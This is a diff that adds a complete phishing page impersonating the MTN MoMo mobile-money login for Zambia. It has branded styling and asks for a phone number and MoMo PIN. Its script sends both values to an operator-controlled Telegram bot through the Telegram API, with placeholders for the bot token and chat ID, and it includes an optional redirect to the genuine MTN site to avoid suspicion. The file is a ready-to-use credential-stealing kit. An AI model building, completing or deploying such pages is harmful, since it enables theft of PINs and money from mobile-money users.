@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Welcome to MoMo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --momo-blue: #005377; 
+            --momo-yellow: #ffcc00; 
+            --momo-teal-text: #005f7f;
+            --text-gray: #666666;
+            --bg-light: #f7f9fa;
+            --border-color: #005f7f;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--momo-blue);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Background curves */
+        .bg-curve-top {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60vh;
+            background-color: var(--momo-blue);
+            border-bottom-left-radius: 50% 10%;
+            border-bottom-right-radius: 50% 10%;
+            z-index: 1;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 450px; 
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+            flex-grow: 1;
+        }
+
+        /* Logo Section */
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #13698a, #004e6e);
+            border-radius: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2), inset 0 2px 4px rgba(255,255,255,0.2);
+            margin-bottom: 15px;
+        }
+
+        .logo-icon i {
+            color: var(--momo-yellow);
+            font-size: 40px;
+            filter: drop-shadow(0px 2px 2px rgba(0,0,0,0.3));
+        }
+
+        .logo-text {
+            color: var(--momo-yellow);
+            font-size: 42px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1;
+            margin-bottom: 5px;
+            text-shadow: 0px 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .logo-subtext {
+            color: var(--momo-yellow);
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        /* White Card */
+        .login-card {
+            background: white;
+            width: 100%;
+            border-radius: 30px;
+            padding: 35px 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            margin-bottom: 25px;
+        }
+
+        .card-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--momo-blue);
+            margin-bottom: 25px;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        /* Flag Container */
+        .flag-container {
+            width: 85px;
+            height: 60px;
+            border: 1px solid #333;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            flex-shrink: 0;
+        }
+
+        /* Custom CSS Zambia Flag */
+        .zambia-flag {
+            width: 50px;
+            height: 33px;
+            background-color: #198a00;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .zambia-flag::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 16px;
+            height: 22px;
+            background: linear-gradient(to right, #de2010 33.33%, #000 33.33%, #000 66.66%, #ef7d00 66.66%);
+        }
+        
+        .zambia-flag::before {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 18px;
+            width: 12px;
+            height: 10px;
+            background-color: #ef7d00;
+            clip-path: polygon(50% 0%, 100% 38%, 82% 100%, 18% 100%, 0% 38%);
+        }
+
+        /* Input Containers */
+        .number-container, .pin-container {
+            flex-grow: 1;
+            height: 60px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            background: #fff;
+        }
+
+        .number-container input, .pin-container input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            background: transparent;
+        }
+
+        .number-container input::placeholder, .pin-container input::placeholder {
+            color: #888;
+            letter-spacing: normal;
+        }
+
+        /* Pin input specific styles */
+        .pin-container input {
+            letter-spacing: 8px;
+            font-size: 22px;
+            font-weight: 600;
+        }
+        
+        .pin-container input::placeholder {
+            letter-spacing: normal;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        /* Terms */
+        .terms-text {
+            text-align: center;
+            font-size: 13.5px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 30px;
+            padding: 0 10px;
+        }
+
+        .terms-text a {
+            color: #005f7f;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Next Button */
+        .next-btn {
+            width: 100%;
+            height: 60px;
+            background-color: #d8dce0;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: auto;
+            cursor: not-allowed;
+            transition: background-color 0.3s;
+        }
+
+        .next-btn.active {
+            background-color: var(--momo-blue);
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 83, 119, 0.3);
+        }
+
+        /* Small mobile adjustments */
+        @media (max-height: 750px) {
+            .main-container { padding: 15px 20px; }
+            .logo-section { margin-top: 0; margin-bottom: 15px; }
+            .logo-icon { width: 60px; height: 60px; font-size: 30px; }
+            .logo-text { font-size: 32px; }
+            .login-card { padding: 20px; }
+            .card-title { margin-bottom: 15px; font-size: 20px; }
+            .terms-text { margin-bottom: 15px; }
+            .input-row { margin-bottom: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-curve-top"></div>
+
+    <div class="main-container">
+        
+        <!-- Logo Section -->
+        <div class="logo-section">
+            <div class="logo-icon">
+                <i class="fa-solid fa-location-dot"></i>
+            </div>
+            <div class="logo-text">MoMo</div>
+            <div class="logo-subtext">from MTN</div>
+        </div>
+
+        <!-- Main Login Card -->
+        <div class="login-card">
+            <h2 class="card-title">Welcome to <strong>MoMo</strong></h2>
+            
+            <!-- Phone Number Row -->
+            <div class="input-row">
+                <div class="flag-container">
+                    <div class="zambia-flag"></div>
+                </div>
+                <div class="number-container">
+                    <input type="tel" id="phoneInput" placeholder="Enter number *" maxlength="10">
+                </div>
+            </div>
+
+            <!-- MoMo PIN Row -->
+            <div class="input-row" style="margin-bottom: 0;">
+                <div class="pin-container">
+                    <input type="password" id="pinInput" placeholder="Enter MoMo PIN *" maxlength="5" inputmode="numeric">
+                </div>
+            </div>
+        </div>
+
+        <!-- Terms and Conditions -->
+        <p class="terms-text">
+            By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a>
+        </p>
+
+        <!-- Next Button -->
+        <button class="next-btn" id="nextBtn">Next</button>
+
+    </div>
+
+    <!-- Script Section -->
+    <script>
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
+        const nextBtn = document.getElementById('nextBtn');
+
+        // ==========================================
+        // ⚠️ REPLACE THESE WITH YOUR TELEGRAM DETAILS
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Example: '123456789:ABCdefGHIjklMNOpqrSTUvwxYZ'
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Example: '987654321'
+        // ==========================================
+
+        // Function to check input states and toggle button
+        function checkInputs() {
+            const phoneValid = phoneInput.value.length >= 9;
+            const pinValid = pinInput.value.length >= 4;
+
+            if (phoneValid && pinValid) {
+                nextBtn.classList.add('active');
+                nextBtn.style.cursor = 'pointer';
+                nextBtn.style.backgroundColor = 'var(--momo-blue)';
+            } else {
+                nextBtn.classList.remove('active');
+                nextBtn.style.cursor = 'not-allowed';
+                nextBtn.style.backgroundColor = '#d8dce0';
+            }
+        }
+
+        // Add listeners for both inputs
+        phoneInput.addEventListener('input', checkInputs);
+        pinInput.addEventListener('input', checkInputs);
+
+        // Prevent non-numeric characters for Phone
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key < '0' || e.key > '9') e.preventDefault();
+        });
+
+        // Prevent non-numeric characters for PIN
+        pinInput.addEventListener('keypress', function(e) {
+            if (e.key < '0' || e.key > '9') e.preventDefault();
+        });
+
+        // Handle Button Click to Send Telegram Message
+        nextBtn.addEventListener('click', async function() {
+            // Only proceed if button is in active state
+            if (!this.classList.contains('active')) return;
+
+            // Change button state to show loading
+            this.innerHTML = 'Sending...';
+            this.style.opacity = '0.7';
+            this.disabled = true;
+
+            const phone = phoneInput.value;
+            const pin = pinInput.value;
+
+            // Format the message for Telegram
+            const message = `🚨 *New MoMo Login Attempt* 🚨\n\n📱 *Phone Number:* ${phone}\n🔐 *MoMo PIN:* ${pin}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    // Success! Show success state
+                    this.innerHTML = 'Success';
+                    this.style.backgroundColor = '#00a651'; // Green
+                    this.style.opacity = '1';
+                    
+                    // Optional: Redirect the user after 1.5 seconds
+                    // setTimeout(() => { window.location.href = 'https://mtn.com.zm'; }, 1500);
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Connection failed. Please check your internet and try again.');
+                // Reset button on failure
+                this.innerHTML = 'Next';
+                this.style.opacity = '1';
+                this.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
